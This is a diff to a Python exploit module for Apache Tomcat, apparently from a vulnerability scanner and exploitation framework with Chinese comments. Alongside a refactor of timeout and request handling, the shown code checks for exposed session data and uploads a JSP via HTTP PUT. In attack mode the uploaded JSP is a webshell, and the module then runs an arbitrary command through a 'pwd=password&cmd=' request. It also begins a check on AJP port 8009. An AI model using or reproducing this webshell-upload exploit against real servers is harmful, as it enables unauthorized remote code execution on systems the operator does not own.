@@ -19,12 +19,10 @@ class ApacheTomcat():
         self.cmd = env.get('cmd')
         self.pocname = env.get('pocname')
         self.vuln = env.get('vuln')
-        self.timeout = env.get('timeout')
-        self.retry_time = env.get('retry_time')
-        self.retry_interval = env.get('retry_interval')
+        self.timeout = int(env.get('timeout'))
         self.flag = GlobalVar.get_value('flag')
-        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo {}'.format(self.flag))
-        self.linux_cmd = env.get('cmd', 'echo {}'.format(self.flag))
+        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo ' + self.flag)
+        self.linux_cmd = env.get('cmd', 'echo ' + self.flag)
 
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
@@ -54,10 +52,10 @@ class ApacheTomcat():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
-            request = exprequest.get(self.url+path, timeout=self.timeout, verify=False)
+            request = exprequest.get(self.url+path)
             if request.status_code == 200 and r"Session ID:" in request.text:
                 #output.echo_success(method, info)
                 return output.echo_success(method, info)
@@ -80,13 +78,13 @@ class ApacheTomcat():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
             #_verify
             if self.vuln == 'False':
-                request = exprequest.put(self.url+path, data=payload1, timeout=self.timeout, verify=False)
-                request = exprequest.get(self.url+path[:-1], timeout=self.timeout, verify=False)
+                request = exprequest.put(self.url+path, data=payload1)
+                request = exprequest.get(self.url+path[:-1])
                 if ':-)' in request.text:
                     info = "[upload]"+" [url:"+self.url+"/"+name+".jsp ]"
                     return output.echo_success(method, info)
@@ -94,9 +92,9 @@ class ApacheTomcat():
                     return output.fail()
             #_attack
             else:
-                request = exprequest.put(self.url+path, data=payload2, timeout=self.timeout, verify=False)
+                request = exprequest.put(self.url+path, data=payload2)
                 urlcmd = self.url+"/"+name+".jsp?pwd=password&cmd="+self.cmd
-                request = exprequest.get(urlcmd, timeout=self.timeout, verify=False)
+                request = exprequest.get(urlcmd)
                 info = "Put Webshell: "+urlcmd+"\n-------------------------\n"+request.text
                 return output.echo_success(method, info)
         except Exception as error:
@@ -114,7 +112,7 @@ class ApacheTomcat():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         #self.default_port = self.port
         default_port = 8009
